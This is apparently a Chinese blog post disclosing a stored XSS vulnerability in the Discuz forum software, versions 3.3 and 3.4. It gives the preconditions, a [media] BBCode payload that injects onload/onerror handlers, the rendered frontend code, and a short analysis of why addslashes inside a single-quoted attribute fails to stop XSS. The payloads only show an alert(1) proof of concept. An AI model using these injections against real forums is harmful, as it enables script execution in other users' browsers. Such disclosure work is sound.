---
title: Disucz正文存储型XSS(2)
date: 2017-10-30 23:08:34
tags:
---
# 漏洞证明
2017.9月份在3.3,3.4最新版测试通过

前提条件:
1.用户组允许使用media标签
2.非PC端用户(程序会判断UA)

复现步骤:
0x1.可以使用media标签的用户发表一篇文章
文章内容为
```
[media=mp3,200,300]http://www.tudou.com/programs/view/a' onload=alert(1) onerror=alert(1)[/media]
```
0x2. 使用手机，或者使用UA修改工具，修改成移动端头部
0x3. 浏览刚发过的帖子，视频加载完毕后，执行onload事件，会弹窗.
![](/img/5.png)

# 漏洞分析
```
<span id="flv_dWh"></span><script type="text/javascript" reload="1">$('flv_dWh').innerHTML=(mobileplayer() ? "<iframe height='300' width='200' src='http://www.tudou.com/programs/view/html5embed.action?code=a\\\' onload=alert(1) onerror=alert(1)' frameborder=0 allowfullscreen></iframe>" : AC_FL_RunContent('width', '200', 'height', '300', 'allowNetworking', 'internal', 'allowScriptAccess', 'never', 'src', 'http://www.tudou.com/v/a\\\' onload=alert(1) onerror=alert(1)', 'quality', 'high', 'bgcolor', '#ffffff', 'wmode', 'transparent', 'allowfullscreen', 'true'));</script></td></tr></table>
```
前端页面中有这么一段代码，非PC时，mobileplayer()=true.
简化下上面的代码，如下:
```
$('flv_dWh').innerHTML="<iframe src='http://www.tudou.com/programs/view/html5embed.action?code=a\\\' onload=alert(1)"
```
其中虽然src属性单引号看似没有闭合，但是实际上浏览器解析时已经闭合了，于是就引入了一个onload属性。

至于后端的代码，在`source/function/function_discuzcode.php`文件的`parseflv`函数中下断点可以调试漏洞，这里就不详细说明。

# 漏洞总结
`src='<?php addslashes("可控内容")?>'`
这样是不能防XSS的,用下面这样的代码是可以弹框的。
`<img src='x\' onerror=alert(1)//'>`
